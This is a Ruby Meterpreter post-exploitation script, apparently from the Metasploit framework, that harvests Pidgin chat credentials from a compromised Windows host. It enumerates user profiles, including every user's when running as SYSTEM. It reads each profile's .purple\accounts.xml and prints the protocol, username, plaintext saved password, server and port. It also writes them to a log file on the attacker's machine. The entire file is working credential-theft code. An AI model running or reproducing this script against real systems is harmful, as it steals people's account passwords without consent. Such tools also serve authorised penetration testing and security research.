#$Id$
require "rexml/document"

#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for extracting configured services with username and passwords."
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}
#-------------------------------------------------------------------------------
#Set General Variables used in the script
@client = client
os = @client.sys.config.sysinfo['OS']
host = @client.sys.config.sysinfo['Computer']
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'winenum', host + filenameinfo )
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
dest = logs + "/" + host + filenameinfo + ".txt"
#-------------------------------------------------------------------------------
#function for checking of Pidgin profile is present
def check_pidgin(path)
	found = nil
	@client.fs.dir.foreach(path) do |x|
		next if x =~ /^(\.|\.\.)$/
		if x =~ (/.purple/)
			found = true
		end
	end
	return found
end
#-------------------------------------------------------------------------------
#function for extracting the credentials
def extract_creds(path)
	accounts_xml = ""
	creds = ""
	print_status("Reading accounts.xml file...")
	account_file = @client.fs.file.new(path + "\\.purple\\accounts.xml", "rb")
	until account_file.eof?
		accounts_xml << account_file.read
	end
	account_file.close
	doc = (REXML::Document.new accounts_xml).root
	doc.elements.each("account") {|element|
		print_status("\tProtocol: #{element.elements["protocol"].text}")
		creds << "#{element.elements["protocol"].text}"
		print_status("\tUsername: #{element.elements["name"].text}")
		creds << ":#{element.elements["name"].text}"
		if element.elements["password"]
			print_status("\tPassword: #{element.elements["password"].text}")
			creds << ":#{element.elements["password"].text}\n"
		else
			print_status("\tPassword not Saved!")
			creds << ":"
		end
		print_status("\tServer: #{element.elements["settings"].elements["setting[@name='server']"].text}")
		creds << ":#{element.elements["settings"].elements["setting[@name='server']"].text}"
		print_status("\tPort: #{element.elements["settings"].elements["setting[@name='port']"].text}")
		creds << ":#{element.elements["settings"].elements["setting[@name='port']"].text}"
		print_status()
		return creds
	}
end
#-------------------------------------------------------------------------------
#Function to enumerate the users if running as SYSTEM
def enum_users(os)
	users = []
	userinfo = {}
	user = @client.sys.config.getuid
	path4users = ""
	sysdrv = @client.fs.file.expand_path("%SystemDrive%")
	if os =~ /7|Vista|2008/
		path4users = sysdrv + "\\users\\"
		path2purple = "\\AppData\\Roaming\\"
	else
		path4users = sysdrv + "\\Documents and Settings\\"
		path2purple = "\\Application Data\\"
	end
	if user == "NT AUTHORITY\\SYSTEM"
		print_status("Running as SYSTEM extracting user list..")
		@client.fs.dir.foreach(path4users) do |u|
			next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini)$/
			userinfo['username'] = u
			userinfo['userpath'] = path4users + u
			users << userinfo
		end
	else
		uservar = @client.fs.file.expand_path("%USERNAME%")
		userinfo['username'] = uservar
		userinfo['userpath'] = path4users + uservar + path2purple
		users << userinfo
	end
	return users
end
#-------------------------------------------------------------------------------
# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
	output = ::File.open(file2wrt, "a")
	if data2wrt
		data2wrt.each_line do |d|
			output.puts(d)
		end
	end
	output.close
end
################## MAIN ##################
print_status("Running Meterpreter Pidgin Credential harvester script")
print_status("All services are loged at #{dest}")
enum_users(os).each do |u|
	print_status("Checking if Pidgin profile is present for user #{u['username']}...")
	if check_pidgin(u['userpath'])
		print_status("Pidging profile found!")
		filewrt(dest,extract_creds(u['userpath']))
	else
		print_error("Pidging profile not found!")
	end
end
